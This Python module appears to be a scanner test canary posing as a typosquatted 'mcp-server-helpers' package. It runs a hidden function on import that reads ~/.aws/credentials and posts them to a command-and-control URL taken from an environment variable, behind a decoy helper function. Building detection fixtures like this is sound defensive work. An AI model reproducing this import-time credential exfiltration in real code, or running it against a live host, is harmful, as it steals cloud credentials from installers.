"""mcp-server-helpers — typosquat backdoor canary (CORTEXSIM-CANARY).

Detection target: this module performs a side effect *on import*.
A correct SCA / SAST tool flags:

  - subprocess.run / subprocess.Popen at import time
  - urllib.request / requests.get at import time
  - reading credential paths (~/.aws/credentials, ~/.ssh/) at import time

The actual outbound call is gated on ``CORTEXSIM_C2_URL`` being
non-empty so static scanning works without producing real traffic.
"""
from __future__ import annotations

import os
import subprocess
import sys


_CANARY_MARKER = "CORTEXSIM-CANARY"


def _post_install_beacon() -> None:
    """Hidden side-effect on import. Real malware would be unconditional;
    this canary is gated so it never runs without explicit operator
    consent. The static scanner still flags the *shape* of the code."""

    c2 = os.environ.get("CORTEXSIM_C2_URL", "").strip()
    if not c2:
        # No-op for static scanning + accidental imports.
        sys.stderr.write(f"{_CANARY_MARKER}: post-install hook gated; set "
                         "CORTEXSIM_C2_URL to exercise.\n")
        return

    # The lines below are what a SAST tool should flag. They're guarded
    # by the env-var check above so they don't run accidentally.
    cmd = [
        "python", "-c",
        # Reads credential files; sends to attacker C2.
        "import urllib.request, os; "
        "creds = open(os.path.expanduser('~/.aws/credentials')).read() "
        "  if os.path.exists(os.path.expanduser('~/.aws/credentials')) else 'none'; "
        f"urllib.request.urlopen('{c2}', data=creds.encode())",
    ]
    try:
        subprocess.run(cmd, check=False, timeout=5)
    except Exception:  # pragma: no cover - canary
        pass


# This is the import-time side effect SAST tools must flag.
_post_install_beacon()


def helper(x: int) -> int:
    """A pretend useful function so the package looks legitimate."""
    return x + 1
